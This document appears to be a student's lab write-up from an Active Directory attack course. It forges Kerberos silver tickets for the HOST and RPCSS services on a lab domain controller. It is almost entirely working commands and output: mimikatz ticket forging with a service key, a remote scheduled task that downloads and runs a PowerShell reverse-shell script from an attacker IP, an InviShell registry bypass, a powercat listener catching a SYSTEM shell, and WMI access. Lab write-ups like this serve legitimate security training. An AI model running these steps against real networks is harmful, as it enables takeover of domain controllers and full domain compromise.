# HANDS-ON 15:

```
During the additional lab time, try to get command execution on the domain controller by
creating silver ticket for:
− HOST service
− WMI

```

## Index of content
  
  1. [Silver Ticket HOST](#silver-ticket-host)
  2. [Silver Ticket WMI](#silver-ticket-wmi)


### Silver Ticket HOST

Generate Silver ticket:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "kerberos::golden /User:Adminsitrator /domain:us-techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /target:us-dc.us.techcorp.local /service:HOST /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /User:Adminsitrator /domain:us-techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /target:us-dc.us.techcorp.local /service:HOST /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Adminsitrator
Domain    : us-techcorp.local (US-TECHCORP)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb - aes256_hmac
Service   : HOST
Target    : us-dc.us.techcorp.local
Lifetime  : 3/17/2023 5:45:48 PM ; 3/18/2023 3:45:48 AM ; 3/24/2023 5:45:48 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Adminsitrator @ us-techcorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!


```
Genrate TGT:
```
C:\Windows\system32>klist

Current LogonId is 0:0x18651dd

Cached Tickets: (1)

#0>     Client: Adminsitrator @ us-techcorp.local
        Server: HOST/us-dc.us.techcorp.local @ us-techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/17/2023 17:45:48 (local)
        End Time:   3/18/2023 3:45:48 (local)
        Renew Time: 3/24/2023 17:45:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Exploit service on the TARGET server machine:
```
C:\Windows\system32>schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\System" /TN "User17" /TR "powershell.exe -c 'iex (New-Object Net.Webclient).DownloadString(''http://192.168.100.17/Invoke-PowerShellTcpEx.ps1''')'"
SUCCESS: The scheduled task "User17" has successfully been created.

C:\Windows\system32>schtasks.exe /run /S us-dc.us.techcorp.local /TN "User17"
SUCCESS: Attempted to run the scheduled task "User17".
```

Linten with Powercat on the student user machine using an other cmd :
```

On the attacker machine side:

Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\studentuser17>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Users\studentuser17>set COR_ENABLE_PROFILING=1

C:\Users\studentuser17>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\studentuser17>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Users\studentuser17>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\studentuser17> . C:\AD\Tools\powercat.ps1
PS C:\Users\studentuser17> powercat -l -v -p 443 -t 1000
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.1.2] port  [tcp] accepted (source port 59288)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user US-DC$ on US-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
US-DC
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::43d7:c42a:5bae:e143%7
   IPv4 Address. . . . . . . . . . . : 192.168.1.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254
PS C:\Windows\system32>

```


### Silver Ticket WMI




For accessisn via WMI it's mandatory create two tickets:
1. Host tiket: Previous 
2. RPCSS ticket:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "privilege::debug" "kerberos::golden /User:Adminsitrator /domain:us-techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /target:us-dc.us.techcorp.local /service:RPCSS /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::golden /User:Adminsitrator /domain:us-techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /target:us-dc.us.techcorp.local /service:RPCSS /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Adminsitrator
Domain    : us-techcorp.local (US-TECHCORP)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb - aes256_hmac
Service   : RPCSS
Target    : us-dc.us.techcorp.local
Lifetime  : 3/17/2023 5:51:54 PM ; 3/18/2023 3:51:54 AM ; 3/24/2023 5:51:54 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Adminsitrator @ us-techcorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```

validate the both tickets:

```
C:\Windows\system32>klist

Current LogonId is 0:0x18651dd

Cached Tickets: (2)

#0>     Client: Adminsitrator @ us-techcorp.local
        Server: RPCSS/us-dc.us.techcorp.local @ us-techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/17/2023 17:51:54 (local)
        End Time:   3/18/2023 3:51:54 (local)
        Renew Time: 3/24/2023 17:51:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#1>     Client: Adminsitrator @ us-techcorp.local
        Server: HOST/us-dc.us.techcorp.local @ us-techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/17/2023 17:45:48 (local)
        End Time:   3/18/2023 3:45:48 (local)
        Renew Time: 3/24/2023 17:45:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```
WMI access to the target machine us-dc.us.techcorp.local:

```
Using powershell wmi access:

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 17763
RegisteredUser  : Windows User
SerialNumber    : 00429-90000-00001-AA056
Version         : 10.0.17763



PS C:\Windows\system32>

```

